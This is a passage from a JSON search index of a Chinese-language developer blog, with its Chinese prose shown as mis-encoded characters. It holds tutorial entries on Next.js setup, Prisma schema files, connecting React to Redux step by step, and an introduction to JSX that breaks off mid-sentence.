æä¾›ç”Ÿäº§æ‰€éœ€çš„æ‰€æœ‰åŠŸèƒ½çš„æœ€ä½³å¼€å‘äººå‘˜ä½“éªŒï¼šæ··åˆé™æ€å’ŒæœåŠ¡å™¨æ¸²æŸ“ã€TypeScript æ”¯æŒã€æ™ºèƒ½æ†ç»‘ã€è·¯ç”±é¢„å–ç­‰ã€‚æ— éœ€é…ç½®ã€‚\nNext.js æ—¨åœ¨æ‹¥æœ‰ä¸€æµçš„å¼€å‘äººå‘˜ä½“éªŒå’Œè®¸å¤šå†…ç½®åŠŸèƒ½\n  ä¸€ä¸ªç›´è§‚çš„åŸºäºé¡µé¢çš„è·¯ç”±ç³»ç»Ÿï¼ˆæ”¯æŒåŠ¨æ€è·¯ç”±ï¼‰\n  é¢„æ¸²æŸ“ï¼Œé™æ€ç”Ÿæˆ(SSG) å’ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“(SSR) å‡ä»¥æ¯é¡µä¸ºåŸºç¡€æ”¯æŒ\n  è‡ªåŠ¨ä»£ç æ‹†åˆ†ä»¥åŠ å¿«é¡µé¢åŠ è½½\n  å…·æœ‰ä¼˜åŒ–é¢„å–çš„å®¢æˆ·ç«¯è·¯ç”±\n  å†…ç½® CSS å’Œ Sass æ”¯æŒï¼Œå¹¶æ”¯æŒä»»ä½• CSS-in-JS åº“\n  æ”¯æŒå¿«é€Ÿåˆ·æ–°çš„å¼€å‘ç¯å¢ƒ\n  ä½¿ç”¨æ— æœåŠ¡å™¨åŠŸèƒ½æ„å»º API ç«¯ç‚¹çš„API è·¯ç”±\n  å®Œå…¨å¯æ‰©å±•\n  åˆ›å»º Next.js åº”ç”¨ 1 2 3 4 5 6 7 8  yarn create next-app --typescript yarn dev //å¼€å‘æ¨¡å¼  yarn build //ç”Ÿäº§æ„å»º  yarn start //å¯åŠ¨ç”Ÿäº§æœåŠ¡å™¨   ","description":"React å¼€å‘æ¡†æ¶ï¼Œç›¸æ¯”äºumiæ›´èƒ½èå…¥æœ€æ–°çš„æŠ€æœ¯","id":15,"section":"react","tags":null,"title":"Next.js é€Ÿè§ˆ","uri":"https://codthing.github.io/react/next/next-base/"},{"content":"Prisma Prisma æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸‹ä¸€ä»£ ORMã€‚å®ƒç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆï¼š\n Prisma å®¢æˆ·ç«¯ï¼šç”¨äº Node.js å’Œ TypeScript çš„è‡ªåŠ¨ç”Ÿæˆå’Œç±»å‹å®‰å…¨çš„æŸ¥è¯¢æ„å»ºå™¨ Prisma Migrate : è¿ç§»ç³»ç»Ÿ Prisma Studioï¼šç”¨äºæŸ¥çœ‹å’Œç¼–è¾‘æ•°æ®åº“ä¸­æ•°æ®çš„ GUI (å¯è§†åŒ–å›¾å½¢å·¥å…·)  ä¸‹é¢æ˜¯ä¸€ä¸ª Prisma æ¨¡å¼æ–‡ä»¶çš„ä¾‹å­ï¼Œå®ƒæŒ‡å®šï¼š\n æ•°æ®æºï¼ˆPostgreSQL æˆ– MongoDBï¼‰ ç”Ÿæˆå™¨ï¼ˆPrisma å®¢æˆ·ç«¯ï¼‰ å…·æœ‰ä¸¤ä¸ªæ¨¡å‹ï¼ˆå…·æœ‰ä¸€ä¸ªå…³ç³»ï¼‰å’Œä¸€ä¸ªæ¨¡å‹çš„æ•°æ®æ¨¡å‹å®šä¹‰ enum å‡ ä¸ªæœ¬æœºæ•°æ®ç±»å‹å±æ€§( @db.VarChar(255), @db.ObjectId)  SQL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  datasource db { url = env(\u0026#34;DATABASE_URL\u0026#34;) provider = \u0026#34;postgresql\u0026#34; } generator client { provider = \u0026#34;prisma-client-js\u0026#34; } model User { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String @db.VarChar(255) author User? @relation(fields: [authorId], references: [id]) authorId Int? } enum Role { USER ADMIN }   NoSQL (MongoDB) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  generator client { provider = \u0026#34;prisma-client-js\u0026#34; previewFeatures = [\u0026#34;mongoDb\u0026#34;] } datasource db { provider = \u0026#34;mongodb\u0026#34; url = env(\u0026#34;DATABASE_URL\u0026#34;) } model User { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String author User? @relation(fields: [authorId], references: [id]) authorId String @db.ObjectId } enum Role { USER ADMIN }   ","description":"å¼€æºçš„ä¸‹ä¸€ä»£ ORMï¼ŒåŸºäº Node.js å’Œ TypeScript","id":17,"section":"nodejs","tags":null,"title":"Prisma ORM","uri":"https://codthing.github.io/nodejs/orm/prisma/"},{"content":"è¿™ä¸¤ç§æŠ€æœ¯çš„å…³é”®åŸåˆ™æ˜¯ä»€ä¹ˆ?\nReact æ˜¯æä¾›æ•°æ®çš„è§†å›¾åº“ï¼Œèƒ½ä»¥é«˜æ•ˆã€å¯é¢„æµ‹çš„æ–¹å¼æ¸²æŸ“è§†å›¾ã€‚\nRedux æ˜¯çŠ¶æ€ç®¡ç†æ¡†æ¶ï¼Œå¯ç”¨äºç®€åŒ– APP åº”ç”¨çŠ¶æ€çš„ç®¡ç†ã€‚\nåœ¨ React Redux app åº”ç”¨ä¸­ï¼Œé€šå¸¸å¯åˆ›å»ºå•ä¸€çš„ Redux store æ¥ç®¡ç†æ•´ä¸ªåº”ç”¨çš„çŠ¶æ€ã€‚\nReact ç»„ä»¶ä»…è®¢é˜… store ä¸­ä¸å…¶è§’è‰²ç›¸å…³çš„æ•°æ®ï¼Œ å¯ç›´æ¥ä» React ç»„ä»¶ä¸­åˆ†å‘ actions ä»¥è§¦å‘ store å¯¹è±¡çš„æ›´æ–°ã€‚\nReact ç»„ä»¶å¯ä»¥åœ¨æœ¬åœ°ç®¡ç†è‡ªå·±çš„çŠ¶æ€ï¼Œä½†æ˜¯å¯¹äºå¤æ‚çš„åº”ç”¨æ¥è¯´ï¼Œå®ƒçš„çŠ¶æ€æœ€å¥½æ˜¯ç”¨ Redux ä¿å­˜åœ¨å•ä¸€ä½ç½®ï¼Œæœ‰ç‰¹å®šæœ¬åœ°çŠ¶æ€çš„ç‹¬ç«‹ç»„ä»¶ä¾‹å¤–ã€‚\nå½“å•ä¸ªç»„ä»¶å¯èƒ½ä»…å…·æœ‰ç‰¹å®šäºå…¶çš„æœ¬åœ°çŠ¶æ€æ—¶ï¼Œç®—æ˜¯ä¾‹å¤–ã€‚\næœ€åä¸€ç‚¹æ˜¯ï¼ŒRedux æ²¡æœ‰å†…ç½®çš„ React æ”¯æŒï¼Œéœ€è¦å®‰è£… react-reduxåŒ…ï¼Œ é€šè¿‡è¿™ä¸ªæ–¹å¼æŠŠ Redux çš„ state å’Œ dispatch ä½œä¸º props ä¼ ç»™ç»„ä»¶ã€‚\nä¸€ã€React å’Œ Redux class DisplayMessages extends React.Component {\r// æ·»åŠ ä¸‹é¢è¿™è¡Œä»£ç \rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\r}\r// æ·»åŠ ä¸Šé¢è¿™è¡Œä»£ç \rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r}; äºŒã€é¦–å…ˆåœ¨æœ¬åœ°ç®¡ç†çŠ¶æ€ class DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\r}\r// åœ¨è¿™é‡Œæ·»åŠ  handleChange() å’Œ submitMessage() æ–¹æ³•\rhandleChange(event) {\rthis.setState({\rinput: event.target.value,\rmessages: this.state.messages\r})\r}\rsubmitMessage() {\rthis.setState({\rinput: \u0026#39;\u0026#39;,\rmessages: [...this.state.messages, this.state.input]\r})\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input onChange={this.handleChange.bind(this)} value={this.state.input} /\u0026gt;\r\u0026lt;button onClick={this.submitMessage.bind(this)}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((x, i) =\u0026gt; {\rreturn \u0026lt;li key={i}\u0026gt;{x}\u0026lt;/li\u0026gt;\r})}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; ä¸‰ã€æå–çŠ¶æ€é€»è¾‘ç»™ Redux å®Œæˆ React ç»„ä»¶åï¼Œéœ€è¦æŠŠåœ¨æœ¬åœ° state æ‰§è¡Œçš„é€»è¾‘ç§»åˆ° Redux ä¸­ï¼Œ è¿™æ˜¯ä¸ºå°è§„æ¨¡ React åº”ç”¨æ·»åŠ  Redux çš„ç¬¬ä¸€æ­¥ã€‚\nè¯¥åº”ç”¨çš„å”¯ä¸€åŠŸèƒ½æ˜¯æŠŠç”¨æˆ·çš„æ–°æ¶ˆæ¯æ·»åŠ åˆ°æ— åºåˆ—è¡¨ä¸­ã€‚\n// å®šä¹‰ ADDã€addMessage()ã€messageReducer() å¹¶åœ¨è¿™é‡Œå­˜å‚¨ï¼š\rconst ADD = \u0026#34;ADD\u0026#34;;\rconst addMessage = message =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r};\r};\r// ä½¿ç”¨ ES6 é»˜è®¤å‚æ•°ç»™ \u0026#39;previous State\u0026#39; å‚æ•°ä¸€ä¸ªåˆå§‹å€¼ã€‚\rconst messageReducer = (previousState = [], action) =\u0026gt; {\r// ä½¿ç”¨switchè¯­å¥æ¥å¸ƒå±€reduceré€»è¾‘ä»¥å“åº”ä¸åŒçš„åŠ¨ä½œç±»å‹\rswitch (action.type) {\rcase ADD:\r// ä½¿ç”¨ ES6 æ‰©å±•è¿ç®—ç¬¦è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ä¸­å°†æ–°æ¶ˆæ¯æ·»åŠ åˆ° previousState\rreturn [...previousState, action.message];\rbreak;\rdefault:\r// å¦‚æœ Redux å­˜å‚¨çš„æ›´æ–°ä¸æ˜¯é’ˆå¯¹æ­¤ç‰¹å®šçŠ¶æ€ï¼Œåˆ™è¦é€€å›åˆ°é»˜è®¤æƒ…å†µã€‚\rreturn previousState;\r}\r};\rconst store = Redux.createStore(messageReducer); å››ã€ä½¿ç”¨ Provider é“¾æ¥ Redux å’Œ React åœ¨ä¸Šä¸€æ­¥ä¸­ï¼Œåˆ›å»ºäº† Redux store å’Œ actionï¼Œåˆ†åˆ«ç”¨äºå¤„ç†æ¶ˆæ¯æ•°ç»„å’Œæ·»åŠ æ–°æ¶ˆæ¯ã€‚\nä¸‹ä¸€æ­¥è¦ä¸º React æä¾›è®¿é—® Redux store åŠå‘èµ·æ›´æ–°æ‰€éœ€çš„ actionsã€‚ react-redux åŒ…å¯å¸®åŠ©æˆ‘ä»¬å®Œæˆè¿™äº›ä»»åŠ¡ã€‚\nreact-redux æä¾›çš„ API æœ‰ä¸¤ä¸ªå…³é”®çš„åŠŸèƒ½ï¼šProvider å’Œ connectã€‚\nProvider æ˜¯ wrapper ç»„ä»¶ï¼Œ å®ƒå…è®¸è®¿é—®æ•´ä¸ªç»„ä»¶æ ‘ä¸­çš„ Redux store åŠ dispatchï¼ˆåˆ†å‘ï¼‰æ–¹æ³•ã€‚\nProvider éœ€è¦ä¸¤ä¸ª propsï¼šRedux store å’Œ App åº”ç”¨çš„å­ç»„ä»¶ã€‚\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: \u0026#39;\u0026#39;,\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rconst Provider = ReactRedux.Provider;\rclass AppWrapper extends React.Component {\r// åœ¨è¿™ä¸€è¡Œä¸‹é¢æ¸²æŸ“ Provider\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;DisplayMessages /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; äº”ã€æ˜ å°„ State åˆ° Props Provider å¯å‘ React ç»„ä»¶æä¾› state å’Œ dispatch ï¼Œä½†å¿…é¡»ç¡®åˆ‡åœ°æŒ‡å®šæ‰€éœ€è¦çš„ state å’Œ actionsï¼Œ ä»¥ç¡®ä¿æ¯ä¸ªç»„ä»¶åªèƒ½è®¿é—®æ‰€éœ€çš„ stateã€‚\nå®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œéœ€è¦åˆ›å»ºä¸¤ä¸ªå‡½æ•°ï¼šmapStateToProps()ã€mapDispatchToProps()ã€‚\nåœ¨è¿™ä¸¤ä¸ªå‡½æ•°ä¸­ï¼Œå£°æ˜ state ä¸­å‡½æ•°æ‰€è¦è®¿é—®çš„éƒ¨åˆ†åŠéœ€è¦ dispatch çš„åˆ›å»º action çš„å‡½æ•°ã€‚\næ³¨æ„ï¼š åœ¨å¹•åï¼ŒReact Redux ç”¨ store.subscribe() æ–¹æ³•æ¥å®ç° mapStateToProps()ã€‚\nconst state = [];\rconst mapStateToProps = (state)=\u0026gt;{\rreturn {\rmessages: state\r}\r} å…­ã€æ˜ å°„ Dispatch åˆ° Props mapDispatchToProps() å‡½æ•°å¯ä¸º React ç»„ä»¶æä¾›ç‰¹å®šçš„åˆ›å»º action çš„å‡½æ•°ï¼Œä»¥ä¾¿ç»„ä»¶å¯ dispatch actionsï¼Œä»è€Œæ›´æ”¹ Redux store ä¸­çš„æ•°æ®ã€‚\nè¯¥å‡½æ•°çš„ç»“æ„è·Ÿä¸Šä¸€æ­¥ä¸­çš„mapStateToProps()å‡½æ•°ç›¸ä¼¼ï¼Œ å®ƒè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ŒæŠŠ dispatch actions æ˜ å°„åˆ°å±æ€§åä¸Šï¼Œè¯¥å±æ€§åæˆä¸ºpropsã€‚\nç„¶è€Œï¼Œæ¯ä¸ªå±æ€§éƒ½è¿”å›ä¸€ä¸ªç”¨ action creator åŠä¸ action ç›¸å…³çš„æ‰€æœ‰æ•°æ®è°ƒç”¨ dispatch çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯è¿”å› state çš„ä¸€éƒ¨åˆ†ã€‚\nå¯ä»¥è®¿é—® dispatchï¼Œå› ä¸ºåœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬ä»¥å‚æ•°å½¢å¼æŠŠå®ƒä¼ å…¥ mapDispatchToProps() äº†ï¼Œè¿™è·Ÿ state ä¼ å…¥ mapStateToProps() æ˜¯ä¸€æ ·çš„ã€‚\nåœ¨å¹•åï¼ŒReact Redux ç”¨ Redux çš„ store.dispatch() æ¥ç®¡ç†è¿™äº›å« mapDispatchToProps() çš„dispatchesï¼Œ è¿™è·Ÿå®ƒä½¿ç”¨ store.subscribe() æ¥è®¢é˜…æ˜ å°„åˆ° state çš„ç»„ä»¶çš„æ–¹å¼ç±»ä¼¼ã€‚\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: \u0026#39;ADD\u0026#39;,\rmessage: message\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r} ä¸ƒã€è¿æ¥ Redux å’Œ React å·²ç»å†™äº†mapStateToProps()ã€mapDispatchToProps() ä¸¤ä¸ªå‡½æ•°ï¼Œç°åœ¨å¯ä»¥ç”¨å®ƒä»¬æ¥æŠŠ state å’Œ dispatch æ˜ å°„åˆ° React ç»„ä»¶çš„ props äº†ã€‚\nReact Redux çš„ connect æ–¹æ³•å¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚\næ­¤æ–¹æ³•æœ‰ mapStateToProps()ã€mapDispatchToProps() ä¸¤ä¸ªå¯é€‰å‚æ•°ï¼Œ å®ƒä»¬æ˜¯å¯é€‰çš„ï¼ŒåŸå› æ˜¯ä½ çš„ç»„ä»¶å¯èƒ½ä»…éœ€è¦è®¿é—® state ä½†ä¸éœ€è¦åˆ†å‘ä»»ä½• actionsï¼Œåä¹‹äº¦ç„¶ã€‚\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: \u0026#39;ADD\u0026#39;,\rmessage: message\r}\r};\rconst mapStateToProps = (state) =\u0026gt; {\rreturn {\rmessages: state\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message));\r}\r}\r};\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;h3\u0026gt;This is a Presentational Component\u0026lt;/h3\u0026gt;\r}\r};\rconst connect = ReactRedux.connect;\r// æ·»åŠ è¿™è¡Œä¸‹é¢çš„ä»£ç \rconst ConnectedComponent = connect(mapStateToProps, mapDispatchToProps)(Presentational) å…«ã€å°† Redux é“¾æ¥åˆ° Messages App åœ¨ä¸Šä¸€æ­¥ï¼Œè¿æ¥åˆ° Redux çš„ç»„ä»¶å‘½åä¸º Presentationalï¼Œè¿™ä¸ªå‘½åä¸æ˜¯ä»»æ„çš„ï¼Œ è¿™æ ·çš„æœ¯è¯­é€šå¸¸æ˜¯æŒ‡æœªç›´æ¥è¿æ¥åˆ° Redux çš„ React ç»„ä»¶ï¼Œ å®ƒä»¬åªè´Ÿè´£æ‰§è¡Œæ¥æ”¶ props çš„å‡½æ•°æ¥å®ç° UI çš„å‘ˆç°ã€‚\nç›¸æ¯”ä¹‹ä¸‹ï¼Œå®¹å™¨ç»„ä»¶ç”¨æ¥è¿æ¥åˆ° Redux ä¸Šã€‚ è¿™äº›ç»„ä»¶é€šå¸¸è´Ÿè´£æŠŠ actions åˆ†æ´¾ç»™ storeï¼Œä¸”ç»å¸¸ç»™å­ç»„ä»¶ä¼ å…¥ store state å±æ€§ã€‚\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: \u0026#39;\u0026#39;,\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// React-Redux:\rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (newMessage) =\u0026gt; {\rdispatch(addMessage(newMessage))\r}\r}\r};\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// åœ¨è¿™é‡Œå®šä¹‰ Container ç»„ä»¶ï¼š\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational)\rclass AppWrapper extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\r// å®Œæˆ return è¯­å¥\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; ä¹ã€å°†å±€éƒ¨çŠ¶æ€æå–åˆ° Redux ä¸­ ç°åœ¨æœ‰äº†è¿æ¥å¥½çš„ Reduxï¼Œè¿˜è¦ä»Presentationalç»„ä»¶ä¸­æå–çŠ¶æ€ç®¡ç†åˆ° Reduxï¼Œ ç›®å‰ï¼Œå·²è¿æ¥ Reduxï¼Œä½†æ­£åœ¨ Presentational ç»„ä»¶ä¸­æœ¬åœ°å¤„ç†çŠ¶æ€ã€‚\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// ä¿®æ”¹è¿™è¡Œä¸‹é¢çš„ä»£ç \rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r// Remove property \u0026#39;messages\u0026#39; from Presentational\u0026#39;s local state\rthis.state = {\rinput: \u0026#39;\u0026#39;\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\r// Call \u0026#39;submitNewMessage\u0026#39;, which has been mapped to Presentational\u0026#39;s props, with a new message;\r// meanwhile, remove the \u0026#39;messages\u0026#39; property from the object returned by this.setState().\rthis.props.submitNewMessage(this.state.input);\rthis.setState({\rinput: \u0026#39;\u0026#39;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{/* The messages state is mapped to Presentational\u0026#39;s props; therefore, when rendering,\ryou should access the messages state through props, instead of Presentational\u0026#39;s\rlocal state. */}\r{this.props.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// ä¿®æ”¹è¿™è¡Œä¸Šé¢çš„ä»£ç \rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r};\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational);\rclass AppWrapper extends React.Component {\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; ","description":" Redux å’Œ React çš„é…åˆï¼Œç”±äºReduxçš„ç¼–å†™æ–¹å¼å¤ªè¿‡äºæ²‰é‡ï¼Œè€Œä¸”ç°åœ¨æœ‰äº†Hooksï¼Œå®Œå…¨å¯ä»¥æŠ›å¼ƒæ²‰é‡çš„Reduxï¼Œå¯ä»¥ä½¿ç”¨Hooksçš„useReducerç¼–å†™å¤æ‚çš„é€»è¾‘ã€‚","id":18,"section":"react","tags":null,"title":"React \u0026 Redux","uri":"https://codthing.github.io/react/redux/react-redux/"},{"content":"ç®€ä»‹ï¼šReact æ˜¯ç”± Facebook åˆ›å»ºå’Œç»´æŠ¤çš„å¼€æºè§†å›¾åº“ã€‚ å®ƒæ˜¯æ¸²æŸ“ç°ä»£ Web åº”ç”¨ç¨‹åºç”¨æˆ·ç•Œé¢ï¼ˆUIï¼‰çš„å¥½å·¥å…·ã€‚\nä¸€ã€JSXï¼ˆJS è¯­æ³•æ‰©å±•ï¼‰ React ä½¿ç”¨åä¸º JSX çš„ JavaScript è¯­æ³•æ‰©å±•ï¼Œå¯ä»¥ç›´æ¥åœ¨ JavaScript ä¸­ç¼–å†™ HTMLã€‚\nè¿™æœ‰å‡ ä¸ªå¥½å¤„ã€‚ å¯ä»¥åœ¨ HTML ä¸­ä½¿ç”¨ JavaScript çš„å®Œæ•´ç¨‹åºåŠŸèƒ½ï¼Œå¹¶æœ‰åŠ©äºä¿æŒä»£ç çš„å¯è¯»æ€§ã€‚\nåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒJSX ç±»ä¼¼äº HTMLï¼Œä½†æ˜¯æ¶‰åŠä¸€äº›å…³é”®å·®å¼‚ã€‚\nä¾‹å¦‚ï¼Œå› ä¸º JSX æ˜¯ JavaScript çš„è¯­æ³•æ‰©å±•ï¼Œæ‰€ä»¥å®é™…ä¸Šå¯ä»¥ç›´æ¥åœ¨ JSX ä¸­ç¼–å†™ JavaScriptã€‚\nè¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œåªéœ€åœ¨èŠ±æ‹¬å·ä¸­åŒ…å«å¸Œæœ›è¢«è§†ä¸º JavaScript çš„ä»£ç ï¼š{ \u0026rsquo;this is treated as JavaScript code\u0026rsquo; }ï¼ˆè¿™è¢«è§†ä¸º JavaScript ä»£ç ï¼‰ã€‚\nä½†æ˜¯ï¼Œç”±äºæµè§ˆå™¨ä¸èƒ½è§£æ JSXï¼Œå› æ­¤å¿…é¡»å°† JSX ä»£ç ç¼–è¯‘ä¸º JavaScriptã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè½¬æ¢å™¨ Babel æ˜¯ä¸€ä¸ªå¾ˆå—æ¬¢è¿çš„å·¥å…·ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåº•å±‚è°ƒç”¨ ReactDOM.render(JSX, document.getElementById(\u0026lsquo;root\u0026rsquo;))ã€‚ è¿™ä¸ªå‡½æ•°è°ƒç”¨å°† JSX ç½®äº React è‡ªå·±çš„è½»é‡çº§ DOM ä¸­ã€‚ ç„¶åï¼ŒReact ä½¿ç”¨è‡ªå·±çš„ DOM å¿«ç…§æ¥å®ç°å¢é‡æ›´æ–°ã€‚\nconst JSX = \u0026lt;h1\u0026gt;Hello JSX!\u0026lt;/h1\u0026gt;;\rconst JSX = \u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Heading.\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;Paragraph\u0026lt;/p\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;Coffee\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Tea\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Milk\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;;\r{/*\u0026lt;h1\u0026gt;Hanoi University of Science\u0026lt;/h1\u0026gt;*/} React æ¸²æŸ“ API ReactDOM.render(ReactNode,document.getElementById(\u0026#39;root\u0026#39;))\r--\u0026gt; Babelè½¬æ¢å™¨\r--\u0026gt; JavaScript\r--\u0026gt; Browser HTML å±æ€§å’Œäº‹ä»¶ä½¿ç”¨é©¼å³°å¼å†™æ³• const JSX = (\r\u0026lt;div className=\u0026#39;myDiv\u0026#39;\u0026gt;\r\u0026lt;h1\u0026gt;Add a class to this div\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r); è¿”å›å•ä¸ªå…ƒç´ ï¼ˆå³åªæœ‰ä¸€ä¸ªçˆ¶å…ƒç´ 